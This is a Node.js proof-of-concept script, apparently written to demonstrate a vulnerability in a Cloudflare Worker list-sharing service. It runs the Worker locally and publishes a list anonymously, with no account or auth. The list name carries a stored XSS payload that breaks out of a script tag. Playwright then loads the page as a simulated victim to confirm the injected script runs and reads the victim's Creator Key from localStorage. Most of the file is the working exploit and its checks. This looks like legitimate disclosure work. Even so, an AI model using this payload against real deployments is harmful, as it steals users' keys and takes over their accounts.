// Real browser proof: serve the Worker over HTTP and load the poisoned page.
import http from "node:http";
import { chromium } from "playwright";
import { makeEnv, makeKv, makeD1, worker } from "../../tests/harness.mjs";

const env = makeEnv({ CONFIGS: makeKv(), DB: makeD1() });
const ctx = { waitUntil: (p) => { Promise.resolve(p).catch(() => {}); } };

const server = http.createServer(async (req, res) => {
  const url = "http://127.0.0.1:" + server.address().port + req.url;
  const chunks = [];
  for await (const c of req) chunks.push(c);
  const init = { method: req.method, headers: req.headers };
  if (chunks.length) init.body = Buffer.concat(chunks);
  let out;
  try { out = await worker.fetch(new Request(url, init), env, ctx); }
  catch (e) { res.writeHead(500); res.end(String(e)); return; }
  const body = Buffer.from(await out.arrayBuffer());
  const h = {};
  out.headers.forEach((v, k) => { h[k] = v; });
  res.writeHead(out.status, h);
  res.end(body);
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const base = "http://127.0.0.1:" + server.address().port;
console.log("worker listening on", base);

// 1. Anonymous publish with a script-breakout name. No account, no auth.
const pub = await (await fetch(base + "/api/publish-list", {
  method: "POST",
  headers: { "Content-Type": "application/json", "CF-Connecting-IP": "203.0.113.9" },
  body: JSON.stringify({
    name: "Top 10 Free Movies </script><script>window.__XSS_RAN=1;document.title='PWNED:'+localStorage.getItem('myListAddon:creatorKey')</script>",
    type: "movie", visibility: "public",
    items: [{ id: "tt0111161", title: "The Shawshank Redemption" }],
  }),
})).json();
console.log("published:", pub);

const browser = await chromium.launch({ executablePath: "/opt/pw-browsers/chromium-1194/chrome-linux/chrome", args: ["--no-sandbox"] });
const page = await browser.newPage();
const errs = [];
page.on("pageerror", (e) => errs.push(String(e).slice(0, 120)));

// Victim is a signed-in user: their Creator Key is in localStorage for this origin.
await page.goto(base + "/robots.txt");
await page.evaluate(() => localStorage.setItem("myListAddon:creatorKey", "MYL-VICT-IMSK-EY01"));

await page.goto(base + "/lists/user/" + pub.listName, { waitUntil: "domcontentloaded" });
const ran = await page.evaluate(() => window.__XSS_RAN === 1);
const title = await page.title();
console.log("attacker script executed in the victim's browser:", ran);
console.log("document.title after payload           :", title);
console.log("page errors:", errs.slice(0, 3));
await browser.close();
server.close();
